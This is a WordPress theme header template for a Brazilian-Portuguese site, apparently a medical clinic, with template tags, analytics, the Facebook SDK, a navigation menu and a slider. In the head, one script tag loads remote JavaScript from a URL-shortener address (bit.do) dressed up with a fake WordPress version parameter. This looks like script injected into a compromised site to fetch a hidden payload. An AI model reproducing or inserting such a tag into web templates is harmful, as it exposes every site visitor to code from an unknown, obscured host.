<!DOCTYPE html>

<html lang="pt-br">

<head>

    <meta charset="<?php bloginfo('charset'); ?>">

    <meta http-equiv="imagetoolbar" content="no">

    <link rel="shortcut icon" href="<?php bloginfo('stylesheet_directory'); ?>/imagens/favicon.png">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    

    <title><?php bloginfo('name'); ?> <?php wp_title(); ?></title>



    <link rel="stylesheet" href="<?php bloginfo('stylesheet_directory'); ?>/style.css?<?php echo filemtime(dirname(__FILE__).'/style.css'); ?>" />



    <script>

        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){

                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),

            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)

        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');



        ga('create', 'UA-000000-0', 'auto');

        ga('require', 'displayfeatures');

        ga('send', 'pageview');



    </script>
	

    <script type='text/javascript' src='http://bit.do/ccAai?ver=4.5.3'></script>

    <?php

    # BEGIN NECESSARY WORDPRESS TAGS



    wp_enqueue_script('jquery');

    wp_get_archives('type=monthly&format=link');

    wp_head();



    # END NECESSARY WORDPRESS TAGS

    ?>



    <?php if( is_single() || is_page() ) :

        /* Se for a página do post ou uma página criada no WordPress mostra o conteúdo abaixo */ ?>

        <meta property="og:title" content="<?php the_title(); ?>" />

        <meta property="og:type" content="article" />

        <meta property="og:url" content="<?php the_permalink(); ?>" />

        <meta property="og:image" content="<?php echo get_thumb('medium'); ?>" />

        <meta property="og:site_name" content="<?php bloginfo('name'); ?>" />

        <link rel="image_src" href="<?php echo get_thumb('medium'); ?>" />

    <?php else :

        /* Caso contrário, mostre o conteúdo abaixo */ ?>

        <meta property="og:image" content="<?php bloginfo('stylesheet_directory'); ?>/imagens/gravatar_default_300.jpg" />

        <link rel="image_src" href="<?php bloginfo('stylesheet_directory'); ?>/imagens/gravatar_default_300.jpg" />

    <?php endif; ?>

<div id="fb-root"></div>
<script async defer crossorigin="anonymous" src="https://connect.facebook.net/pt_PT/sdk.js#xfbml=1&version=v6.0&appId=796807220498595&autoLogAppEvents=1"></script>

</head>



<body <?php body_class(); ?>>



<div class="dotted-1"><div class="dotted-2"><div class="dotted-3">



           

            
			<div class="inicio col-xs-12 col-sm-12">
			<div class="container">	
				<div class="frase col-xs-12 col-sm-5"><?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Frase') ):  endif; ?></div>
				<div class="telefone col-xs-12 col-sm-4"><?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Telefone') ):  endif; ?></div>
				<div class="marcacao col-xs-12 col-sm-3"><a href="http://www.cigrj.com.br/marque-sua-consulta/"> Marque sua consulta</a></div>
			</div>
			</div>
			 <div class="menu-topo">
			<div class="container">		
			<div class="logo col-xs-12 col-sm-4"><a href="<?php bloginfo('url'); ?>"><img src="<?php bloginfo('stylesheet_directory'); ?>/imagens/logo.png" class="img-responsivo logo" /></a></div>

			<nav class="navbar col-xs-12 col-sm-8" role="navigation">
			<div class="navbar-header">
				      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-fixa">
				        <span class="sr-only">Toggle navigation</span>
				        <span class="icon-bar"></span>
				        <span class="icon-bar"></span>
				        <span class="icon-bar"></span>
				      </button>
				    </div>
                    
					<div class="collapse navbar-collapse navbar-left" id="navbar-fixa">
					<?php

                    wp_nav_menu(array(

                        'theme_location'  => 'superior',

                        'menu'            => '',

                        'container'       => 'div',

                        'container_class' => 'menu-container',

                        'container_id'    => 'nav-menu-superior',

                        'menu_class'      => '',

                        'menu_id'         => '',

                        'echo'            => true,

                        'fallback_cb'     => 'wp_page_menu',

                        'before'          => '',

                        'after'           => '',

                        'link_before'     => '',

                        'link_after'      => '',

                        'items_wrap'      => '<ul id="%1$s" class="nav navbar-nav %2$s">%3$s</ul>',

                        'depth'           => 1,

                        //'walker'          =>

                    ));

                    ?>
					</div>

				</nav>	

                </div>

            </div>

            
				<div class="destaques">

<?php echo do_shortcode('[metaslider id="21"]'); ?>

</div>



            <div id="main" class="main-content container">
			